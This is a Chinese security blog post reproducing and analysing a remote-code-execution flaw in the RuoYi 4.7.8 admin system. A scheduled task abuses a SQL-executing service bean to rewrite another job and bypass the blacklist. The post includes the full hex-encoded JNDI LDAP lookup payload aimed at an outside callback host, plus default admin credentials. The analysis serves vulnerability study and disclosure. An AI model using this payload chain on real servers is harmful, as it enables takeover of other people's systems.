#  RuoYi 4.7.8 执行任意SQL语句导致RCE漏洞   
原创 0Fs47  Timeline Sec   2024-05-24 19:30  
  
>   
> 关注我们 ❤️，添加星标 🌟，一起学安全！作者：0Fs47@Timeline Sec 本文字数：1392 阅读时长：2～4 mins声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
RuoYi 是一个后台管理系统，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf）主要目的让开发者注重专注业务，降低技术难度，从而节省人力成本，缩短项目周期，提高软件安全质量。  
## 0x02 漏洞概述  
  
RuoYi v4.7.8 若依后台管理系统通过定时任务调用 genTableServiceImpl 直接执行 sql 来更改定时任务内容，从而绕过黑白名单的限制，实现RCE。  
## 0x03 影响版本  
  
RuoYi v4.7.8  
## 0x04 环境搭建  
  
官网地址：http://ruoyi.vip  
  
文档地址：https://doc.ruoyi.vip/ruoyi/document/hjbs.html  
  
创建数据库 ry 并导入数据脚本 ry_2021xxxx.sql，quartz.sql  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruqXicAv8APwkAQl1YJhpKiaYpDjTP5aaNjq3C3eGHMLyVbfYyRTibOGGvw/640?wx_fmt=png&from=appmsg "")  
  
idea 载入项目，找到 ruoyi-admin\src\main\resources\application-druid.yml，修改数据库配置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruDZ4iaWdPiaICAhoDhYfKHYebcJuj2Q3JkntkSrPBpIa934h9XFOkibw8A/640?wx_fmt=png&from=appmsg "")  
  
然后运行 com.ruoyi.RuoYiApplication.java，出现如下图表示启动成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7norumUZnSTicRicB7hKHnkGXY4IqkdZ2spYN7sLzQTiciaksGCyS8qqHFAWiaOA/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
  
本地搭建好环境，访问http://localhost/login  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruRpjNApPv7ojuEtpSSK42liaIwIMDdDQKAC8tFEiaBSCEJIW1hsd6s4Pg/640?wx_fmt=png&from=appmsg "")  
  
admin/amdin123 登录后台，首先创建一个任务 id100：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7norugicDetO9uIG1EFjKa1PJb1O4hOicjvAPVYzNNpsEEe9iaayVo98Qu2Agw/640?wx_fmt=png&from=appmsg "")  
  
再另外创建一个任务，内容如下：  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a6....... WHERE job_id = 100;')

```  
  
SQL 语句中的 16 进制为我们要执行的代码：  
```
javax.naming.InitialContext.lookup('ldap://xxxxx')

```  
  
创建任务 101  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruCJOS90uacxwAFibwfpmhE49Lclgk3AkysQiaKicednibTTNtruVwr9jCww/640?wx_fmt=png&from=appmsg "")  
  
可以看到任务 100 已经更新为需要执行的代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruiaMvibFG8icZkz3OOcBCMt9McZdg2dN6NSibkqdbefpRBeMwUUjibV5459w/640?wx_fmt=png&from=appmsg "")  
  
成功收到回显  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruDNIqSXGqh7DcJx6QqdEWVypl1w7aT8vuxyrNLLnib3JUlicJ1icDyKWmg/640?wx_fmt=png&from=appmsg "")  
## 0x06 漏洞分析  
  
从复现的步骤可以看出，RCE 是由定时任务加上 SQL 注入造成的。  
  
**定时任务分析**  
  
定时任务添加：  
  
定位到 com/ruoyi/quartz/controller/SysJobController#addSave 方法中，可以看到在添加定时任务前，对字符串进行了黑白名单的判断  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7norumSAocQdP0huAwfcNQNDASmJRd6MP4sRzzEbwsOg5OD0iaalfibHBgzrg/640?wx_fmt=png&from=appmsg "")  
  
当通过了上述条件后，则执行 com/ruoyi/quartz/service/impl/SysJobServiceImpl#insertJob，先将定时任务写入数据库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruM6Z7Rp9gtCx3icbjP97Oxjeja2nbKd0ia5B55MiadicyjlNMxjXdfC9phA/640?wx_fmt=png&from=appmsg "")  
  
然后创建定时任务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noru9WutwjXkck9iafwTx2HPsTV9e2DuNsSsfECWa0tOWJu2FDOdNDicPH5A/640?wx_fmt=png&from=appmsg "")  
  
然后就是定时任务执行逻辑，进入 com/ruoyi/quartz/util/AbstractQuartzJob#execute  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruibjNj74DfX0JmF2ct0I4YOAt3Eop50LUicUZVpAOEZRibD1WferglfUZQ/640?wx_fmt=png&from=appmsg "")  
  
继续跟进，进入 invokeMethod 方法  
  
getInvokeTarget：调用目标字符串，获取数据库中 invoke_target 字段  
  
getBeanName：获取 beanName  
  
getMethodName：获取方法名  
  
getMethodParams：获取参数名  
  
然后判断是不是全限定类名，若不是则从 spring 容器中获取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruD76ur8wZ9yqjIae7ibUXXHectq4UMzUTRicHXkmdbCcbDjwiawbnEYR7w/640?wx_fmt=png&from=appmsg "")  
  
继续跟进 invokeMethod 方法，利用反射执行方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7norulAqc9zskG20ibENWNVYKUL9czWnkMic8icUjz4pYhO0huPgibH1DbtemvQ/640?wx_fmt=png&from=appmsg "")  
  
从上可分析出如下结果：  
1. 对象可以是 spring 容器中注册过的 bean，也可以指定 class 名称  
  
1. 若是 spring 容器中注册过的 bean，则可直接从 spring 容器中取出，若是指定 class 名称，则可以通过反射 newInstance()创建对象  
  
**SQL 注入分析**  
  
在 ruoyi 4.7.5 版本之前，后台接口/tool/gen/createTable处存在 sql 注入(CVE-2022-4566)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7norunoxaUMZWzaIyrxS4pDicj8qAoHpI0W5ichibJTs2fq6eiaCsiaXibXC7auuQ/640?wx_fmt=png&from=appmsg "")  
  
而 genTableService 的实现类是 GenTableServiceImpl  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7norucIRQxqicF5sHvWNuz3T1vv9ACy2D5wopMeLDwI0px2725LfMJ4vwwaQ/640?wx_fmt=png&from=appmsg "")  
  
对应的 Mapper 语句  
```
<update id="createTable">
       ${sql}
</update>

```  
  
运行结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noru4lcrfRnAib3KurensrZWY9MrVWXVrazrjW5nxV6PGRQlMkdeKZR6Xag/640?wx_fmt=png&from=appmsg "")  
  
**RCE 分析**  
  
根据上文可知，ruoyi 计划任务能调用 bean 或者 class 类，SQL 注入依赖于 GenTableServiceImpl#createTable。如果 GenTableServiceImpl 是 bean 对象，就可以直接调用 GenTableServiceImpl#createTable 执行 SQL 语句  
  
在启动类中打印所有加载的 bean，其中包括 genTableServiceImpl  
```
 ConfigurableApplicationContext run = SpringApplication.run(RuoYiApplication.class, args);
// 获取所有bean的名称
String[] beanDefinitionNames = run.getBeanDefinitionNames();
// 打印所有bean的名称
for (String beanDefinitionName : beanDefinitionNames) {
    System.out.println(beanDefinitionName);
}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruibT8unia89o3kydkeYhQquK6ibLntIUrOkBcGTxOC2UiamLtbV8dbPBViag/640?wx_fmt=png&from=appmsg "")  
  
于是可以调用 genTableServiceImpl.createTable 实现 sql 语句执行，所以 RCE 的思路：配合注入在 sys_job 数据表中直接插入恶意计划任务，即可不调用 addSave 方法添加计划任务内容，成功绕过黑白名单限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruE8LkQnuQMZic98uFshsI5ZvQ2U4BUYLTtR3HIicC43PwAYIEiaTq3kGAg/640?wx_fmt=png&from=appmsg "")  
  
细节：  
  
在添加 SQL 定时任务时，可以通过 16 进制转换绕过黑名单检测  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target =0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f797670307a662e646e736c6f672e636e2729 WHERE job_id = 100;')

```  
  
成功调用 genTableServiceImpl.createTable 方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noru9ZHrPicZicYy0s4dzyD7DA4mN6cpicf3ColMz2KarcU2loAHCiaKww3Bmg/640?wx_fmt=png&from=appmsg "")  
  
成功修改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruoZum2gPQmZoibZQPd60NyRhTtApcXpK0xlzq9Gkx7Or72PnVKdf7CXg/640?wx_fmt=png&from=appmsg "")  
  
执行代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiarf3s1sEcjtzNcVVT7noruhjI1pXNL5gJ6vCsDyal0HOUtSzthy7V7PbDhvhFHK1oEkEKWbjewgw/640?wx_fmt=png&from=appmsg "")  
## 0x06 修复方式  
  
升级至最新版本。  
## 参考链接  
  
https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC  
  
https://xz.aliyun.com/t/11336  
## 历史漏洞  
  
https://blog.takake.com/posts/7219/  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群回复  
【SRC群】进入SRC-QQ交流群回复  
【新人】领取新人学习指南资料回复  
【面试】获取渗透测试常见面试题回复  
【合作】获取各类安全项目合作方式回复  
【帮会】付费加入SRC知识库学习回复  
【  
培训】获取官方直播精品课程详情  
  
  
视频号：搜索  
TimelineSec  
  
官方微博：[#小程序://微博/tPbUYdN9EucSD4C]()  
  
  
哔哩哔哩：  
https://space.bilibili.com/52459  
‍1903  
  
  
  
❤  
  
觉得有用就收藏起来吧！  
  
顺便点个赞和在看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
